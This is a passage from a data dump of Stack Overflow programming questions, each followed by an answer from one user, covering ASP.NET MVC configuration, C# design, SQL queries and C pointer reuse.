        _W.WriteLine(value);
        return this;
    }
}
</code></pre>
","33708","Mehrdad Afshari","<p>Performance-wise, this will require more string copies to be done. <code>HtmlTextWriter</code> writes directly to the output buffer. <code>StringBuilder</code> on the other hand, has its own buffer. When you call <code>ToString</code> on the <code>StringBuilder</code>, a new string has to be built and then it will be written to the output buffer by <code>output.Write</code>. It requires much more work to be done.</p>
"
"<p>When I go to File > New Website there isn't a template for MVC. I googled ""how to use MVC with vwd?"" and these links came up </p>

<p><a href=""http://geekswithblogs.net/jwhitehorn/archive/2007/12/10/117569.aspx"" rel=""nofollow"">http://geekswithblogs.net/jwhitehorn/archive/2007/12/10/117569.aspx</a><br />
<a href=""http://jerusahat.wordpress.com/2007/12/12/aspnet-mvc-template-for-visual-web-developer-2008-express/"" rel=""nofollow"">http://jerusahat.wordpress.com/2007/12/12/aspnet-mvc-template-for-visual-web-developer-2008-express/</a><br />
<a href=""http://www.lazycoder.com/weblog/2007/12/10/using-the-aspnet-mvc-framework-with-visual-web-developer-express/"" rel=""nofollow"">http://www.lazycoder.com/weblog/2007/12/10/using-the-aspnet-mvc-framework-with-visual-web-developer-express/</a>  </p>

<p>but none of them seem to work. I just get assembly reference errors and after I hookup the assemblies I get:</p>

<p>Error   1	'System.Web.Routing.Route' does not contain a constructor that takes '0' arguments</p>

<p>Error   2	Cannot implicitly convert type 'AnonymousType#1'</p>

<p>Error   3	Cannot implicitly convert type 'System.Type' to 'System.Web.Routing.IRouteHandler'.</p>

<p>and so on...</p>

<p>Is VWD2008 compatible with ASP.NET MVC?</p>
","33708","Mehrdad Afshari","<p>Yes, I'm sure it <b>is</b> compatible with ASP.NET MVC.</p>

<p>All you need is to add the assemblies to <code>bin</code> folder and edit <code>Web.config</code> and <code>Global.asax</code> files.</p>

<p>Start with an empty plain ASP.NET site (not the ones in templates as I've not tested them). Add the assemblies to <code>bin</code> and...</p>

<p><code>Web.config</code> should look like:</p>

<pre><code>&lt;?xml version=""1.0""?&gt;

&lt;configuration&gt;

  &lt;configSections&gt;
    &lt;sectionGroup name=""system.web.extensions"" type=""System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""&gt;
      &lt;sectionGroup name=""scripting"" type=""System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""&gt;
        &lt;section name=""scriptResourceHandler"" type=""System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" requirePermission=""false"" allowDefinition=""MachineToApplication""/&gt;
        &lt;sectionGroup name=""webServices"" type=""System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""&gt;
          &lt;section name=""jsonSerialization"" type=""System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" requirePermission=""false"" allowDefinition=""Everywhere"" /&gt;
          &lt;section name=""profileService"" type=""System.Web.Configuration.ScriptingProfileServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" requirePermission=""false"" allowDefinition=""MachineToApplication"" /&gt;
          &lt;section name=""authenticationService"" type=""System.Web.Configuration.ScriptingAuthenticationServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" requirePermission=""false"" allowDefinition=""MachineToApplication"" /&gt;
          &lt;section name=""roleService"" type=""System.Web.Configuration.ScriptingRoleServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" requirePermission=""false"" allowDefinition=""MachineToApplication"" /&gt;
        &lt;/sectionGroup&gt;
      &lt;/sectionGroup&gt;
    &lt;/sectionGroup&gt;
  &lt;/configSections&gt;

  &lt;appSettings/&gt;

  &lt;system.web&gt;

    &lt;compilation debug=""false""&gt;
      &lt;assemblies&gt;
        &lt;add assembly=""System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089""/&gt;
        &lt;add assembly=""System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
        &lt;add assembly=""System.Web.Abstractions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
        &lt;add assembly=""System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
        &lt;add assembly=""System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
        &lt;add assembly=""System.Data.DataSetExtensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089""/&gt;
        &lt;add assembly=""System.Xml.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089""/&gt;
        &lt;add assembly=""System.Data.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"" /&gt;
      &lt;/assemblies&gt;
    &lt;/compilation&gt;


    &lt;pages&gt;
      &lt;controls&gt;
        &lt;add tagPrefix=""asp"" namespace=""System.Web.UI"" assembly=""System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
        &lt;add tagPrefix=""asp"" namespace=""System.Web.UI.WebControls"" assembly=""System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;/controls&gt;

      &lt;namespaces&gt;
        &lt;add namespace=""System.Web.Mvc""/&gt;
        &lt;add namespace=""System.Web.Mvc.Ajax""/&gt;
        &lt;add namespace=""System.Web.Mvc.Html""/&gt;
        &lt;add namespace=""System.Web.Routing""/&gt;
        &lt;add namespace=""System.Linq""/&gt;
        &lt;add namespace=""System.Collections.Generic""/&gt;
      &lt;/namespaces&gt;
    &lt;/pages&gt;

    &lt;httpHandlers&gt;
      &lt;remove verb=""*"" path=""*.asmx""/&gt;
      &lt;add verb=""*"" path=""*.asmx"" validate=""false"" type=""System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add verb=""*"" path=""*_AppService.axd"" validate=""false"" type=""System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add verb=""GET,HEAD"" path=""ScriptResource.axd"" type=""System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" validate=""false""/&gt;
      &lt;add verb=""*"" path=""*.mvc"" validate=""false"" type=""System.Web.Mvc.MvcHttpHandler, System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
    &lt;/httpHandlers&gt;

    &lt;httpModules&gt;
      &lt;add name=""ScriptModule"" type=""System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add name=""UrlRoutingModule"" type=""System.Web.Routing.UrlRoutingModule, System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" /&gt;
    &lt;/httpModules&gt;

  &lt;/system.web&gt;

  &lt;system.codedom&gt;
    &lt;compilers&gt;
      &lt;compiler language=""c#;cs;csharp"" extension="".cs"" warningLevel=""4""
                type=""Microsoft.CSharp.CSharpCodeProvider, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""&gt;
        &lt;providerOption name=""CompilerVersion"" value=""v3.5""/&gt;
        &lt;providerOption name=""WarnAsError"" value=""false""/&gt;
      &lt;/compiler&gt;

      &lt;compiler language=""vb;vbs;visualbasic;vbscript"" extension="".vb"" warningLevel=""4""
                type=""Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""&gt;
        &lt;providerOption name=""CompilerVersion"" value=""v3.5""/&gt;
        &lt;providerOption name=""OptionInfer"" value=""true""/&gt;
        &lt;providerOption name=""WarnAsError"" value=""false""/&gt;
      &lt;/compiler&gt;
    &lt;/compilers&gt;
  &lt;/system.codedom&gt;

  &lt;system.web.extensions/&gt;
  &lt;system.webServer&gt;
    &lt;validation validateIntegratedModeConfiguration=""false""/&gt;

    &lt;modules runAllManagedModulesForAllRequests=""true""&gt;
      &lt;remove name=""ScriptModule"" /&gt;
      &lt;remove name=""UrlRoutingModule"" /&gt;
      &lt;add name=""ScriptModule"" preCondition=""managedHandler"" type=""System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add name=""UrlRoutingModule"" type=""System.Web.Routing.UrlRoutingModule, System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" /&gt;
    &lt;/modules&gt;

    &lt;handlers&gt;
      &lt;remove name=""WebServiceHandlerFactory-Integrated""/&gt;
      &lt;remove name=""ScriptHandlerFactory"" /&gt;
      &lt;remove name=""ScriptHandlerFactoryAppServices"" /&gt;
      &lt;remove name=""ScriptResource"" /&gt;
      &lt;remove name=""MvcHttpHandler"" /&gt;
      &lt;remove name=""UrlRoutingHandler"" /&gt;
      &lt;add name=""ScriptHandlerFactory"" verb=""*"" path=""*.asmx"" preCondition=""integratedMode""
           type=""System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add name=""ScriptHandlerFactoryAppServices"" verb=""*"" path=""*_AppService.axd"" preCondition=""integratedMode""
           type=""System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add name=""ScriptResource"" preCondition=""integratedMode"" verb=""GET,HEAD"" path=""ScriptResource.axd"" type=""System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" /&gt;
      &lt;add name=""MvcHttpHandler"" preCondition=""integratedMode"" verb=""*"" path=""*.mvc"" type=""System.Web.Mvc.MvcHttpHandler, System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
      &lt;add name=""UrlRoutingHandler"" preCondition=""integratedMode"" verb=""*"" path=""UrlRouting.axd"" type=""System.Web.HttpForbiddenHandler, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" /&gt;
    &lt;/handlers&gt;
  &lt;/system.webServer&gt;

&lt;/configuration&gt;
</code></pre>

<p>Global.asax should contain something like:</p>

<pre><code>public static void RegisterRoutes(RouteCollection routes)
{
    routes.IgnoreRoute(""{resource}.axd/{*pathInfo}"");

    routes.MapRoute(
        ""Default"",                                              // Route name
        ""{controller}/{action}/{id}"",                           // URL with parameters
        new { controller = ""Home"", action = ""Index"", id = """" }  // Parameter defaults
    );

}

protected void Application_Start()
{
    RegisterRoutes(RouteTable.Routes);
}
</code></pre>

<p><code>Default.aspx</code> should have this <code>Page_Load</code> in code behind if you are using IIS7 Classic or IIS6 or below:</p>

<pre><code>public void Page_Load(object sender, System.EventArgs e)
{
    HttpContext.Current.RewritePath(Request.ApplicationPath, false);
    IHttpHandler httpHandler = new MvcHttpHandler();
    httpHandler.ProcessRequest(HttpContext.Current);
}
</code></pre>

<p>You should have a <code>Views</code> folder with a <code>Web.config</code> looking like:</p>

<pre><code>&lt;?xml version=""1.0""?&gt;
&lt;configuration&gt;
  &lt;system.web&gt;
    &lt;httpHandlers&gt;
      &lt;add path=""*"" verb=""*""
          type=""System.Web.HttpNotFoundHandler""/&gt;
    &lt;/httpHandlers&gt;
    &lt;pages
     validateRequest=""false""
     pageParserFilterType=""System.Web.Mvc.ViewTypeParserFilter, System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""
     pageBaseType=""System.Web.Mvc.ViewPage, System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""
     userControlBaseType=""System.Web.Mvc.ViewUserControl, System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""&gt;
      &lt;controls&gt;
        &lt;add assembly=""System.Web.Mvc, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"" namespace=""System.Web.Mvc"" tagPrefix=""mvc"" /&gt;
      &lt;/controls&gt;
    &lt;/pages&gt;
  &lt;/system.web&gt;

  &lt;system.webServer&gt;
    &lt;validation validateIntegratedModeConfiguration=""false""/&gt;
    &lt;handlers&gt;
      &lt;remove name=""BlockViewHandler""/&gt;
      &lt;add name=""BlockViewHandler"" path=""*"" verb=""*"" preCondition=""integratedMode"" type=""System.Web.HttpNotFoundHandler""/&gt;
    &lt;/handlers&gt;
  &lt;/system.webServer&gt;
&lt;/configuration&gt;
</code></pre>

<p>Put the views in a subfolder in <code>Views</code>. They should inherit from <code>System.Web.Mvc.ViewPage</code>. Put the controllers in <code>Controllers</code> namespace with a class name ending with <code>Controller</code>.</p>

<p>This should do the job.</p>
"
"<p>I want a way to be able to schedule callbacks, I want to be able register lots of different callbacks at various times to a ""Scheduler""-object. Something like this.</p>

<pre><code>public class Foo
{
    public void Bar()
    {
        Scheduler s = new Scheduler();
        s.Schedule(() =&gt; Debug.WriteLine(""Hello in an hour!""), DateTime.Now.AddHours(1));
        s.Schedule(() =&gt; Debug.WriteLine(""Hello a week later!""), DateTime.Now.AddDays(7));
    }
}
</code></pre>

<p>The best way I can come up with for implementing the Scheduler is to have a timer running inside at a given interval and each time the interval has elapsed I check the registered callbacks and see if it's time to call them, if so I do. This is quite simple but has the drawback that you only get the ""resolution"" of the timer. Let's say the timer is set to tick once a second and you register a callback to be called in half a second it still may not be called for a whole second.</p>

<p>Is there a better way to solve this?</p>
","33708","Mehrdad Afshari","<p>This is a good approach. You should dynamically set the timer to go off as soon as the next event is going to occur. You do this by putting jobs in a priority queue. After all, in any case you are <b>always limited to the resolution</b> the system can provide, but you should code so that it be the <b>only</b> limiting factor.</p>
"
"<p>Keep in mind that I don't want to use the GAC since my assemblies are frequently updated and I do not wish to register them after each update.</p>
","33708","Mehrdad Afshari","<p>You could probably use NTFS directory junctions. I haven't tested but they should work.</p>
"
"<p>What would be the most efficient way to do a paging query in SQLServer 2000?</p>

<p>Where a ""paging query"" would be the equivalent of using the LIMIT statement in MySQL.</p>

<p>EDIT: Could a stored procedure be more efficient than any set based query in that case?</p>
","33708","Mehrdad Afshari","<p>I think a nested <code>SELECT TOP n</code> query is probably the most efficient way to accomplish it.</p>

<pre><code>SELECT TOP ThisPageRecordCount *
FROM Table
WHERE ID NOT IN (SELECT TOP BeforeThisPageRecordCount ID FROM Table ORDER BY OrderingColumn)
ORDER BY OrderingColumn
</code></pre>

<p>Replace <code>ThisPageRecordCount</code> with items per page and <code>BeforeThisPageRecordCount</code> with <code>(PageNumber - 1) * items-per-page</code>.</p>

<p>Of course the better way in SQL Server 2005 is to use the <code>ROW_NUMBER()</code> function in a CTE.</p>
"
"<p>I'm trying to develop a sql query that will return a list of serial numbers.  The table is set up that whenever a serial number reaches a step, the date and time are entered.  When it completes the step, another date and time are entered.  I want to develop a query that will give me the list of serial numbers that have entered the step, but not exitted the step.  They may enter more than once, so I'm only looking for serial numbers that don't have exits after and enter.</p>

<p>Ex.(for easy of use, call the table ""Table1"")</p>

<pre><code> 1. Serial | Step  | Date

 2. 1      | enter | 10/1
 3. 1      | exit  | 10/2
 4. 1      | enter | 10/4
 5. 2      | enter | 10/4
 6. 3      | enter | 10/5
 7. 3      | exit  | 10/6
</code></pre>

<p>For the above table, serial numbers 1 and 2 should be retrieved, but 3 should not.</p>

<p>Can this be done in a signle query with sub queries?</p>
","33708","Mehrdad Afshari","<pre><code>SELECT DISTINCT Serial
FROM Table t
WHERE (SELECT COUNT(*) FROM Table t2 WHERE t.Serial = t2.Serial AND Step = 'exit') &lt;
      (SELECT COUNT(*) FROM Table t2 WHERE t.Serial = t2.Serial AND Step = 'enter')
</code></pre>
"
"<p>I have 2 vector of with one has vec1{e1,e2,e3,e4}  and the other one with vec2 {e2,e4,e5,e7} </p>

<p>How to effectively get three vector from above vectors such that 1.has elements that is available only in vec1 similarly 2 has only vec2 elements  and 3.with common elements</p>
","33708","Mehrdad Afshari","<p>If the element count is low, you can use the naive approach which is easy to implement and has O(n<sup>2</sup>) running time.</p>

<p>If you have a large number of elements, you can build a hash table from one of them and look up other vector's elements in it. Alternatively, you could sort one of them and binary search through it.</p>
"
"<p>My application receives strings that represent objects.  I have to parse the strings to get the property values for the object I'm creating.  Each object will have to know the specifics about how many attributes there are, what each attribute means, etc.  However, I want to avoid having each class know about how to parse the string.  I'd rather pass each individual object a more fitting data structure (like a dataset or XML)...something easier to populate its properties with.  </p>

<p>Is there anything built in to the .NET framework that is suited for this type of thing?  Or should I create my own container object?</p>

<p><strong>ADD:</strong></p>

<p>I don't think I explained my question well enough initially.  Here's an example to clarify.</p>

<p>Let's say my program is always passed a string of characters that represents a data table in Wiki syntax.  Something like:</p>

<pre><code>  {||Client:||ABC|-|Contact:||Joe Smith|-|Current revision:||1.0||}
</code></pre>

<p>I don't want each one of my specific wiki table objects (e.g., ClientContactTable, CustomerOrderTable, etc.) to know how to parse out | and - and }.  So I'd like to write 1 chunk of code that parses the string into some ""middle"" tier object that I can pass to the constructor of each specific Wiki table object.</p>

<p><strong>My question is:</strong> what should that middle tier object be?</p>
","33708","Mehrdad Afshari","<p>I might have understood your question incorrectly, but I think standard .NET serialization suits your needs:</p>

<pre><code>var ms = new MemoryStream();
var formatter = new BinaryFormatter();
formatter.Serialize(ms, myObject);

// Deserialization:
var deserialized = (MyClass)formatter.Deserialize(stream);
</code></pre>
"
"<p>Given the tables:</p>

<p>role: roleid, name<br />
  permission: permissionid, name<br />
  role_permission: roleid, permissionid  </p>

<p>I have a set of permissions, and I want to see if there is an existing role that has these permissions, or if I need to make a new one. Note that I already know the permissionid, so really the permission table can be ignored - I just included it here for clarity.</p>

<p>Is this possible to do in a SQL query? I imagine it would have to be a dynamically-generated query.</p>

<p>If not, is there any better way than the brute force method of simply iterating over every role, and seeing if it has the exact permissions?</p>

<p>Note, I'm looking for a role that has the exact set of permissions - no more, no less. </p>
","33708","Mehrdad Afshari","<p>You can select all roles that have the subset of permissions you are looking for. Count the number of permissions and see if it's exactly equal to the number of permissions you need:</p>

<pre><code>select r.roleid 
from role r
where not exists (select * from role_permissions rp where rp.roleid = r.roleid and rp.permissionid not in (1,2,3,4)) -- id of permissions
   and (select count(*) from role_permissions rp where rp.roleid = r.roleid) = 4 -- number of permissions
</code></pre>
"
"<p>I'm creating an XML document and I want to store URLs inside the a node like so:</p>

<pre><code>&lt;ns:url&gt;http://example.com&lt;/ns:ulr&gt;
</code></pre>

<p>My question is, do I need to encode/escape the URL in anyway?</p>

<p>If I do, the will the .Net XmlDocument object handle this for me?</p>
","33708","Mehrdad Afshari","<p>I doubt there will be any need to escape it in general. However, you might have some application level requirement to do so. </p>

<p>You should absolutely encode the URL as XML text (for example, it shouldn't contain <code>&gt;</code>).</p>

<p><b>Clarification:</b> This does not mean you should pass the encoded text to the DOM implementation. All XML APIs I know do that for you; so for all practical situations, you wouldn't need to do it manually. I just said it should be <b>done</b>.</p>
"
"<p>Is it safe and predictable to reuse pointers after freeing the data they point to?</p>

<p>For example:</p>

<pre><code>char* fileNames[] = { ""words.txt"", ""moreWords.txt"" };
char** words = NULL;
int* wordsCount = NULL;
for ( i = 0; i &lt; 2; ++i ) {
    data = fopen( fileNames[i], ""r"" );
    words = readWords( data );
    wordsCount = countWords( words );

    free( wordsCount );
    for ( j = 0; words[j]; ++j )
        free( words[j] );
    free( words );
    fclose( data );
}
</code></pre>

<p>*error checking omitted</p>

<p>I am running the code and it appears to run (no warnings, errors, or memory problems) but I am wondering if this is safe and predictable to use in most environments (specifically in a typical Linux environment)?</p>

<p>If this isn't 'safe and predictable', what is the best way to accomplish the same operations on two different files, short of creating two times the amount of pointers, etc?</p>

<p><strong>EDIT:</strong> I am asking if it is okay to reusing a pointer <strong>variable</strong> after freeing what it pointed to. I understand you should not use a pointer <strong>value</strong> after freeing.
Assume the code works perfectly (it works as intended, memory is being freed correctly and such). I cannot change the spec. for this assignment. </p>

<p>Thanks!</p>
","33708","Mehrdad Afshari","<p>I can't see any technical issue with reusing them. It might harm from readability and maintainability perspective and increase the chance of errors.</p>
"
"<p>I have an unmanged C++ class I have written in an unmanged dll.  I have a managed dll that references the unmanaged dll.  Can a class in the managed dll derive from the unmanaged class?</p>

<p>Using Visual Studio 2008</p>
","33708","Mehrdad Afshari","<p>You can't. Instances of managed classes are garbage collected and created on the CLR heap. Instances of unmanaged classes are allocated on the unmanaged heap. How could you be able to create an object whose data is partially on the managed heap and its base data on the unmanaged heap?</p>

<p>You should try other techniques, e.g. wrap a managed container over the unmanaged thing or vice versa and derive from that, probably.</p>
"
"<p>I would have quite general question. Have you ever had to really compute(e.g on the paper) complexity of an algorithm except at school as a programmer? And if.. can you give me an example please.</p>

<p>thank you :)</p>
","33708","Mehrdad Afshari","<p>I don't know if you consider programming contests as school or not, but to see if you can solve a contest problem (with the specified problem size constraints) in the time limit, you have to roughly estimate the number of operations by considering the complexity of the algorithm used.</p>
"
"<p>I know very little about FoxPro but have a project that requires working with a third-party application, based on FoxPro, and a .fxp file.  The thrid-party app is a point of sale system and the makers of the software have provided a .fxp file that allows us to export product information into an XML format.</p>

<p>The problem that I am running into is that the software has no way to schedule the .fxp file to run at a regular interval which we need to keep that XML file updated.</p>

<p>My question is, can a .fxp file be executed outside of FoxPro?</p>

<p>Alternatively, can I create my own FoxPro application to execute their .fxp file and have it connect to the POS database to perform the export.</p>

<p>Any ideas or alternatives are welcome.</p>

<p>Thanks,
Brian</p>
","33708","Mehrdad Afshari","<p>Write another FoxPro program and run it with ""DO file.fxp"" or import FXP file into a project, set it as startup and build.</p>
"
"<p>There's the (almost religious) discussion, if you should use LIKE or '=' to compare strings in SQL statements.</p>

<ul>
<li>Are there reasons to use LIKE?</li>
<li>Are there reasons to use '='?</li>
<li>Performance? Readability? </li>
</ul>

<p>Thanks in advance!</p>
","33708","Mehrdad Afshari","<p><code>LIKE</code> is used for pattern matching and <code>=</code> is used for equality test (as defined by the <code>COLLATION</code> in use). </p>

<p><code>=</code> can use indexes while <code>LIKE</code> queries usually require testing every single record in the result set to filter it out (unless you are using full text search) so <code>=</code> has better performance.</p>
"
"<p>Our workstations are running 64-bit Vista, and the production servers for our ASP.NET MVC web apps are 64-bit Server 2008 servers.  However, our build server running TeamCity is a Server 2008 32-bit server.  We will taking these builds and deploying them on the 64-bit production servers.  The applications are written all in C#.  Should I be concerned about doing the builds in a 32-bit environment?  Is it necessary to upgrade our build server?</p>
","33708","Mehrdad Afshari","<p>Technically, there should be no problem in doing so as the compiler will only generate IL code that is not platform dependent. </p>

<p>The .NET application will run on x64 CLR in the production environment. At runtime, the JIT compiler will produce x64 code.</p>
"
"<p>I was reading up on Midori and kinda started wondering if this is possible.</p>

<p>On a managed OS, ""managed code"" is going to be native, and ""native code"" is going to be...alien? Is it possible, at least theoretically, to run the native code of today on a managed OS?</p>
","33708","Mehrdad Afshari","<p>Technically, a native code emulator can be written in managed code, but it's not running on bare hardware.</p>

<p>I doubt any managed OS that relies on software verification to isolate access to shared resources (such as Singularity) allows running unmanaged code directly since it might be able to bypass all the protections provided by the software (unlike normal OSes, some managed OSes don't rely on protection techniques provided by hardware).</p>
"
"<p>I'm writing a <a href=""http://microformats.org"" rel=""nofollow"">microformats</a> parser in C# and am looking for some refactoring advice. This is probably the first ""real"" project I've attempted in C# for some time (I program almost exclusively in VB6 at my day job), so I have the feeling this question may become the first in a series ;-)</p>

<p>Let me provide some background about what I have so far, so that my question will (hopefully) make sense.</p>

<p>Right now, I have a single class, <code>MicroformatsParser</code>, doing all the work. It has an overloaded constructor that lets you pass a <code>System.Uri</code> or a <code>string</code> containing a URI: upon construction, it downloads the HTML document at the given URI and loads it into an <code>HtmlAgilityPack.HtmlDocument</code> for easy manipulation by the class.</p>

<p>The basic API works like this (or will, once I finish the code...):</p>

<pre><code>MicroformatsParser mp = new MicroformatsParser(""http://microformats.org"");
List&lt;HCard&gt; hcards = mp.GetAll&lt;HCard&gt;();

foreach(HCard hcard in hcards) 
{
    Console.WriteLine(""Full Name: {0}"", hcard.FullName);

    foreach(string email in hcard.EmailAddresses)
        Console.WriteLine(""E-Mail Address: {0}"", email);
}
</code></pre>

<p>The use of generics here is intentional. I got my inspiration from the way that the the Microformats library in Firefox 3 works (and the Ruby <code>mofo</code> gem). The idea here is that the parser does the heavy lifting (finding the actual microformat content in the HTML), and the microformat classes themselves (<code>HCard</code> in the above example) basically provide the schema that tells the parser how to handle the data it finds.</p>

<p>The code for the <code>HCard</code> class should make this clearer (note this is a not a complete implementation):</p>

<pre><code>[ContainerName(""vcard"")]
public class HCard
{
    [PropertyName(""fn"")]
    public string FullName;

    [PropertyName(""email"")]
    public List&lt;string&gt; EmailAddresses;

    [PropertyName(""adr"")]
    public List&lt;Address&gt; Addresses;

    public HCard()
    { 
    }
}
</code></pre>

<p>The attributes here are used by the parser to determine how to populate an instance of the class with data from an HTML document. The parser does the following when you call <code>GetAll&lt;T&gt;()</code>:</p>

<ul>
<li>Checks that the type <code>T</code> has a <code>ContainerName</code> attribute (and it's not blank)</li>
<li>Searches the HTML document for all nodes with a <code>class</code> attribute that matches the <code>ContainerName</code>. Call these the ""container nodes"".</li>
<li>For each container node:
<ul>
<li>Uses reflection to create an object of type <code>T</code>.</li>
<li>Get the public fields (a <code>MemberInfo[]</code>) for type <code>T</code> via reflection</li>
<li>For each field's <code>MemberInfo</code>
<ul>
<li>If the field has a <code>PropertyName</code> attribute
<ul>
<li>Get the value of the corresponding microformat property from the HTML</li>
<li><strong>Inject the value found in the HTML into the field (i.e. set the value of the field on the object of type <code>T</code> created in the first step)</strong></li>
<li>Add the object of type <code>T</code> to a <code>List&lt;T&gt;</code></li>
</ul></li>
</ul></li>
<li>Return the <code>List&lt;T&gt;</code>, which now contains a bunch of microformat objects</li>
</ul></li>
</ul>

<p>I'm trying to figure out a better way to implement the step in <strong>bold</strong>. The problem is that the <code>Type</code> of a given field in the microformat class determines not only what node to look for in the HTML, but also how to interpret the data.</p>

<p>For example, going back to the <code>HCard</code> class I defined above, the <code>""email""</code> property is bound to the <code>EmailAddresses</code> field, which is a <code>List&lt;string&gt;</code>. After the parser finds all the <code>""email""</code> child nodes of the parent <code>""vcard""</code> node in the HTML, it has to put them in a <code>List&lt;string&gt;</code>. </p>

<p>What's more, if I want my <code>HCard</code> to be able to return phone number information, I would probably want to be able to declare a new field of type <code>List&lt;HCard.TelephoneNumber&gt;</code> (which would have its own <code>ContainerName(""tel"")</code> attribute) to hold that information, because there can be multiple <code>""tel""</code> elements in the HTML, and the <code>""tel""</code> format has its own sub-properties. But now the parser needs to know how to put the telephone data into a <code>List&lt;HCard.TelephoneNumber&gt;</code>.</p>

<p>The same problem applies to <code>Float</code>S, <code>DateTime</code>S, <code>List&lt;Float&gt;</code>S, <code>List&lt;Integer&gt;</code>S, etc.</p>

<p>The obvious answer is to have the parser switch on the type of field, and do the appropriate conversions for each case, but I want to avoid a giant <code>switch</code> statement. Note that I'm not planning to make the parser support every possible <code>Type</code> in existence, but I will want it to handle most scalar types, and the <code>List&lt;T&gt;</code> versions of them, along with the ability to recognize other microformat classes (so that a microformat class can be composed from other microformat classes).</p>

<p>Any advice on how best to handle this? </p>

<p>Since the parser has to handle primitive data types, I don't think I can add polymorphism at the type level... </p>

<p>My first thought was to use method overloading, so I would have a series of a <code>GetPropValue</code> overloads like <code>GetPropValue(HtmlNode node, ref string retrievedValue)</code>, <code>GetPropValue(HtmlNode, ref List&lt;Float&gt; retrievedValue)</code>, etc. but I'm wondering if there is a better approach to this problem.</p>
","33708","Mehrdad Afshari","<p>Instead of a large switch statement you can construct a dictionary that maps the string to a delegate and look it up when you want to parse using the appropriate method.</p>
"
"<p>I am using LINQ and am having a hard time understanding how I can make new ""domain model"" classes work within LINQ while querying across tables.  I am using Linq to SQL, and C# in .NET 3.5.</p>

<p>Suppose I want an Extended Client class:</p>

<pre><code>public class ExtendedClient 
{
    public int ID { get; set; }
    public string Name { get; set; }
    public string strVal { get; set; }
}
</code></pre>

<p>and in my data layer, I want to populate this from two tables (dc is my DataContext):</p>

<pre><code>public ExtendedClient getExtendedClient(int clientID)
{
    var c = dc.GetTable&lt;tClient&gt;();
    var cs = dc.GetTable&lt;tClientSetting&gt;();
    var q = from client in c
            join setting in cs
            on client.ClientID equals setting.ClientID
            where client.ClientID == clientID
            select new ExtendedClient { client, setting.strValue };
    return q;   
}
</code></pre>

<p>I am trying to return the row in the table tClient plus one extra column in tClientSetting.</p>

<p>The annoying errors I get are :
Cannot initialize type 'ExtendedClient' with a collection initializer because it does not implement 'System.Collections.IEnumerable'
and
Cannot implicitly convert type 'System.Linq.IQueryable' to 'ExtendedClient'. An explicit conversion exists (are you missing a cast?)</p>

<p>I realize this is a basic error, but I cannot determine how BEST to implement the IEnumerable because I cannot find an example. </p>

